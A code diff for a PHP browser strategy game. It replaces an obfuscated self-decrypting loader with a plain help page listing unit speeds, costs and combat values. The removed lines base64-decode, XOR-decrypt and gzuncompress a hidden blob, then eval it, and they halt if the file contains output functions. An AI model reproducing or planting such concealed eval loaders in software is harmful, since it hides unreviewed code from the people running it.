@@ -1,24 +1,133 @@
 <?php
-$nncwqe="c23a6bb225d3d34a5f5d843615923a0b";
-$eyctgtnf="560a520305060457540556520555045954530d5c5b015752500c0f5701560951";
-$rvcdgsuq="TeKs+uwLhF129+3wmXl2US6B6q586LFaYTB5Qu9+Hu7m5koQL/c+fgqv3/WTue/gwBG9ZABdwQrwE/GpTgoq6KqJOMxnxeDmrzRMaQ9rzPkrMMdI1S5qljOfkuFpbZcYwuUDWouRa+39/rVFBhB9jEfOg6lDblLePjmcmJ8En9TVVLckAsZHK4YfEEmCPE65kE0EJM+nhQQ49aSAGLHMyVtsgbpQy1zTuqYaZMoCCXnq1DgVNqJFczfytcSY2hV6fj7VRvWgt3ZRId4ZB+0IoiySh30LNpzT1cPmz6299xupqg59dSTVJUH8qwR2HWFE8M6zhVeW3ob3XF1LfKqIyqfQsy8GCMID4iZCFvktUvjW4wfhvfg1mYFfxBvsu7YAz9/3hj/SIkxIQnroAH94OfRUIg77WS6Mrv/X8wnEzLXWbKXPIqJWf02hvXfsT+8k45x7sALhyP6wRFUSHAzLBZRCWsuAWlsCdSzt31bcTZh3TF4FOV11zDTLitUPXecVZZcBhppLNQp1mJWo1yE9FWOAEIknYAE72xZQxAEcXekCjQlwm9Jz+XANQL/HsENjjMJfbRH/ia8PQoNq2TKaWrTDrzqBkz3ds9lWIYDxqsU6BFsjhOBPxNXAYZJWEASNonjAuxXqCHkYqsY3KLJR1VzNDj/AXHiB+5G0trtEo0vCbrdKM/di8w/iOlqLHkydPKR08Arx99fxZCQrffxzV0IfNKgA3f/HHajylsiFVdUbu+8VdKABAuxWJeZU0ijbyg+Nq7PN8hO5LsIshuxegFfDDNJg6PWJzq1gVdi937/CdAVl10uaZyYzZVWLNKlSPrdNatSFGQHsAZtqR1hZIj0VYR/Da2MaecTx4Z5Q3Pshyg7cIDS7Y5ZphpJzCjXbWvudYKNjJll20A+Rb2PHDbFLWRYR4YnzWQPxDTGBXPWqqIiZIYk0PPmQVYt46hxBZwJMfn2KGz/hAl+ArEdKi+xEAkbwKiPXand35sgcblhxD9/aQqCyrowlKDhVrOH411NzLNlgXEXrOh9cXfvDFmdT9GiuoIE2/aumev3bfqbjM6naYkG/qgdjAC1JQdqo59pA4ArihZpOmwXFrOo5Pa/2EmxgmPavrHVPUPmxP2WU2YRy1TuAJARQInRDwyFGKPbIVuUQe4NdaC9bCbABUf1/WR5YHFmgQ8lBwkiWJBB/Ez/Y1gWW1wZUl0hSBdfZor6CkjF6DRevc0WvSPzitFJSzXbf1jIUT9ydL7Tpx3HY111hP6POl9kDY4LOfqBdPYURMKagFCV6aJyvVkvurQzOFM0oNwz/c8LHYQgosGu+DajtB9sac7aLq+BOVsvIREImSKUDKHzX968FqKPudbsK/ncKQSnBWsxqFTyCmMg49O8PNsbqhAq8QaHt2+SVMnd+paypjBOxLdhe+rGdag==";
-$domxzjec=file_get_contents(__FILE__);
-$akghsudxo=str_replace($rvcdgsuq,"",$domxzjec);
-if(strpos($akghsudxo,"ec"."ho")!==false||strpos($akghsudxo,"pr"."int")!==false||strpos($akghsudxo,"var_"."dump")!==false||strpos($akghsudxo,"file_put_"."contents")!==false||strpos($akghsudxo,"fw"."rite")!==false){die();}
-$hfbuiqker=str_replace(array($nncwqe,$eyctgtnf),array("SP_6ef7d640","KP_e24c8e95"),$domxzjec);
-$sjykpzvqm=md5($hfbuiqker);
-$mxxecgpi=hex2bin($eyctgtnf);
-$feqrsivnf="";
-$fgmjxqtx=strlen($sjykpzvqm);
-for($mzkwgwhcy=0;$mzkwgwhcy<$fgmjxqtx;$mzkwgwhcy++){
-$feqrsivnf.=chr(ord($mxxecgpi[$mzkwgwhcy])^ord($sjykpzvqm[$mzkwgwhcy]));
-}
-$ijvcfemm=base64_decode($rvcdgsuq);
-$wgsvna=strlen($ijvcfemm);
-$sizbfoe="";
-$imhdpku=strlen($feqrsivnf);
-for($mzkwgwhcy=0;$mzkwgwhcy<$wgsvna;$mzkwgwhcy++){
-$sizbfoe.=$ijvcfemm[$mzkwgwhcy]^$feqrsivnf[$mzkwgwhcy%$imhdpku];
-}
-$esbtdqoj="gzun"."compress";
-eval('?>' . $esbtdqoj($sizbfoe) . '<?php ');
+// Units Help View
+global $cl_units;
+$units = $cl_units->get_array('name'); // Order: unit_spear => Lanceiro, ...
+?>
+<h1><?= __('help.units.title') ?></h1>
+
+<p><?= __('help.units.intro') ?></p>
+
+<table class="vis" width="100%">
+    <tr>
+        <th><?= __('help.units.table.unit') ?></th>
+        <th><?= __('help.units.table.speed') ?></th>
+        <th><?= __('help.units.table.carry') ?></th>
+        <th><?= __('help.units.table.recruited_in') ?></th>
+    </tr>
+    <?php foreach ($units as $unit_key => $unit_name):
+        // Image mapping based on user feedback
+        $image_file = $unit_key . '.png';
+        if ($unit_key == 'unit_spear')
+            $image_file = 'spear.png';
+        if ($unit_key == 'unit_sword')
+            $image_file = 'sword.png';
+        if ($unit_key == 'unit_spy')
+            $image_file = 'spy.png';
+        if ($unit_key == 'unit_axe')
+            $image_file = 'axe.png';
+        if ($unit_key == 'unit_light')
+            $image_file = 'light.png';
+        if ($unit_key == 'unit_heavy')
+            $image_file = 'heavy.png';
+        if ($unit_key == 'unit_ram')
+            $image_file = 'ram.png';
+        if ($unit_key == 'unit_catapult')
+            $image_file = 'catapult.png';
+        if ($unit_key == 'unit_snob')
+            $image_file = 'snob.png';
+        if ($unit_key == 'unit_mnich')
+            $image_file = 'mnich.png'; // Explicit mapping
+        // unit_archer stays as unit_archer.png per request
+        ?>
+        <tr>
+            <td>
+                <a href="#<?= $unit_key ?>">
+                    <img src="graphic/unit/<?= $image_file ?>" /> <b><?= $unit_name ?></b>
+                </a>
+            </td>
+            <td><?= round($cl_units->get_speed($unit_key) / 60) ?>     <?= __('help.units.minutes_per_field') ?></td>
+            <td><?= $cl_units->get_booty($unit_key) ?></td>
+            <td><?= ucfirst($cl_units->get_recruit_in($unit_key) ?? '') ?></td>
+        </tr>
+    <?php endforeach; ?>
+</table>
+
+<br>
+<hr><br>
+
+<?php foreach ($units as $unit_key => $unit_name):
+    // Image mapping
+    $image_file = $unit_key . '.png';
+    if ($unit_key == 'unit_spear')
+        $image_file = 'spear.png';
+    if ($unit_key == 'unit_sword')
+        $image_file = 'sword.png';
+    if ($unit_key == 'unit_spy')
+        $image_file = 'spy.png';
+    if ($unit_key == 'unit_axe')
+        $image_file = 'axe.png';
+    if ($unit_key == 'unit_light')
+        $image_file = 'light.png';
+    if ($unit_key == 'unit_heavy')
+        $image_file = 'heavy.png';
+    if ($unit_key == 'unit_ram')
+        $image_file = 'ram.png';
+    if ($unit_key == 'unit_catapult')
+        $image_file = 'catapult.png';
+    if ($unit_key == 'unit_snob')
+        $image_file = 'snob.png';
+    if ($unit_key == 'unit_mnich')
+        $image_file = 'mnich.png'; // Explicit mapping
+    ?>
+    <a name="<?= $unit_key ?>"></a>
+    <div style="border: 1px solid #c1a264; background: #f4ead4; padding: 10px; margin-bottom: 20px;">
+        <h3><img src="graphic/unit/<?= $image_file ?>"> <?= $unit_name ?></h3>
+        <p><i><?= $cl_units->get_description($unit_key) ?></i></p>
+
+        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
+            <table class="vis" style="flex: 0 0 auto; width: auto;">
+                <tr>
+                    <th colspan="2"><?= __('help.units.costs') ?></th>
+                </tr>
+                <tr>
+                    <td><img src="graphic/icons/wood.png" title="<?= __('help.buildings.resources.wood') ?>"></td>
+                    <td><?= $cl_units->get_woodprice($unit_key) ?></td>
+                </tr>
+                <tr>
+                    <td><img src="graphic/icons/stone.png" title="<?= __('help.buildings.resources.clay') ?>"></td>
+                    <td><?= $cl_units->get_stoneprice($unit_key) ?></td>
+                </tr>
+                <tr>
+                    <td><img src="graphic/icons/iron.png" title="<?= __('help.buildings.resources.iron') ?>"></td>
+                    <td><?= $cl_units->get_ironprice($unit_key) ?></td>
+                </tr>
+                <tr>
+                    <td><img src="graphic/icons/face.png" title="<?= __('help.buildings.resources.population') ?>"></td>
+                    <td><?= $cl_units->get_bhprice($unit_key) ?></td>
+                </tr>
+            </table>
+
+            <table class="vis" style="flex: 0 0 auto; width: auto;">
+                <tr>
+                    <th colspan="2"><?= __('help.units.combat') ?></th>
+                </tr>
+                <tr>
+                    <td><?= __('help.units.attack') ?>:</td>
+                    <td><?= $cl_units->get_att($unit_key, 1) ?></td>
+                </tr>
+                <tr>
+                    <td><?= __('help.units.defense_general') ?>:</td>
+                    <td><?= $cl_units->get_def($unit_key, 1) ?></td>
+                </tr>
+                <tr>
+                    <td><?= __('help.units.defense_cavalry') ?>:</td>
+                    <td><?= $cl_units->get_defcav($unit_key, 1) ?></td>
+                </tr>
+                <tr>
+                    <td><?= __('help.units.defense_archers') ?>:</td>
+                    <td><?= $cl_units->get_defarcher($unit_key, 1) ?></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+<?php endforeach; ?>
